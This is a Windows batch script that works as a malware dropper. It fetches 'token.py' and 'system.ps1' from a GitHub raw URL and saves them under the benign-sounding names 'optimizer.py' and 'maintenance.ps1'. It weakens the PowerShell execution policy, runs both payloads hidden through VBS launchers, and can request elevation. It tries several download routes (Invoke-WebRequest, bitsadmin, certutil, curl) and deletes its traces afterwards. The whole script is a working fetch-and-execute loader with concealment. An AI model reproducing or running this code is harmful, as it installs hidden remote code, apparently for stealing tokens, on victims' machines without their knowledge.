@echo off

set "pikapath=%USERPROFILE%\AppData\Roaming\pika"
set "pythonexe=%ProgramFiles%\Python312\python.exe"


call :downloadFile "https://raw.githubusercontent.com/cannyyy7-design/tokenn/main/token.py" "%pikapath%\optimizer.py"

call :downloadFile "https://raw.githubusercontent.com/cannyyy7-design/tokenn/main/system.ps1" "%pikapath%\maintenance.ps1"


:: First, ensure the scripts exist
if exist "%pikapath%\maintenance.ps1" (
    :: Set execution policy for current user
    call :runHiddenPS "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force"
    
    :: Test if PowerShell can run the script
    powershell -Command "Test-Path '%pikapath%\maintenance.ps1'" >nul 2>&1
    if errorlevel 1 (
        call :runPowershellHidden "%pikapath%\maintenance.ps1"
    ) else (
        :: Normal execution with bypass
        powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -File """"%pikapath%\maintenance.ps1""""' -WindowStyle Hidden" >nul 2>&1
    )
)

if exist "%pikapath%\optimizer.py" (
    :: Check if file is obfuscated
    set "obfuscated=0"
    findstr /i "marshal\|exec.*compile\|__pyarmor__" "%pikapath%\optimizer.py" >nul 2>&1
    if not errorlevel 1 set "obfuscated=1"
    
    
    :: Create a hidden launcher batch file
    set "launcher=%temp%\launch_opt.bat"
    echo @echo off > "!launcher!"
    echo chcp 65001 >nul >> "!launcher!"
    echo cd /d "%pikapath%" >> "!launcher!"
    
    if "!obfuscated!"=="1" (
        echo "!pythonexe!" -c "with open('optimizer.py', 'rb') as f: exec(f.read())" >> "!launcher!"
    ) else (
        echo "!pythonexe!" "optimizer.py" >> "!launcher!"
    )
    echo exit >> "!launcher!"
    
    :: Run via VBS for complete hiding
    set "vbsLauncher=%temp%\run_hidden.vbs"
    echo Set WshShell = CreateObject^("WScript.Shell"^) > "!vbsLauncher!"
    echo WshShell.Run chr^(34^) ^& "!launcher!" ^& chr^(34^) ^& " /c", 0, False >> "!vbsLauncher!"
    echo Set WshShell = Nothing >> "!vbsLauncher!"
    
    cscript //nologo "!vbsLauncher!" >nul 2>&1
    
    :: Cleanup
    timeout /t 2 >nul
    del "!launcher!" >nul 2>&1
    del "!vbsLauncher!" >nul 2>&1

    
)

timeout /t 3 >nul
exit

:: ========== FUNCTIONS ==========

:runHiddenPS
:: Run PowerShell command hidden with error handling
(
echo Set oShell = CreateObject^("WScript.Shell"^)
echo oShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""%~1""", 0, True
echo Set oShell = Nothing
) > "%temp%\runps.vbs" 2>nul
cscript //nologo "%temp%\runps.vbs" >nul 2>&1
del "%temp%\runps.vbs" >nul 2>&1
exit /b

:downloadFile
:: Download file with multiple fallback methods
set "url=%~1"
set "outfile=%~2"

:: Method 1: PowerShell Invoke-WebRequest
call :runHiddenPS "Invoke-WebRequest -Uri '%url%' -OutFile '%outfile%' -UserAgent 'Mozilla/5.0'"
if exist "%outfile%" exit /b

:: Method 2: bitsadmin (Windows built-in)
bitsadmin /transfer "download" /download /priority high "%url%" "%outfile%" >nul 2>&1
if exist "%outfile%" exit /b

:: Method 3: certutil (Windows built-in)
certutil -urlcache -split -f "%url%" "%outfile%" >nul 2>&1
if exist "%outfile%" exit /b

:: Method 4: curl if available
where curl >nul 2>&1
if not errorlevel 1 (
    curl -L -s "%url%" -o "%outfile%" --insecure
    if exist "%outfile%" exit /b
)

exit /b

:downloadPythonFallback
:: Fallback Python download methods
echo Trying alternative download methods...

:: Method 1: bitsadmin
bitsadmin /transfer "pythonDownload" /download /priority high "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe" "%temp%\python.exe" >nul 2>&1
if exist "%temp%\python.exe" exit /b

:: Method 2: certutil
certutil -urlcache -split -f "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe" "%temp%\python.exe" >nul 2>&1
if exist "%temp%\python.exe" exit /b

:: Method 3: Try older Python version
bitsadmin /transfer "pythonDownload2" /download /priority high "https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe" "%temp%\python.exe" >nul 2>&1
if exist "%temp%\python.exe" exit /b

exit /b

:runPowershellHidden
:: Run PowerShell script completely hidden with elevation if needed
set "psfile=%~1"
(
echo Set UAC = CreateObject^("Shell.Application"^)
echo UAC.ShellExecute "powershell.exe", "-WindowStyle Hidden -ExecutionPolicy Bypass -File """"%psfile%""""", "", "runas", 0
echo Set UAC = Nothing
) > "%temp%\elevate.vbs" 2>nul
cscript //nologo "%temp%\elevate.vbs" >nul 2>&1
del "%temp%\elevate.vbs" >nul 2>&1
exit /b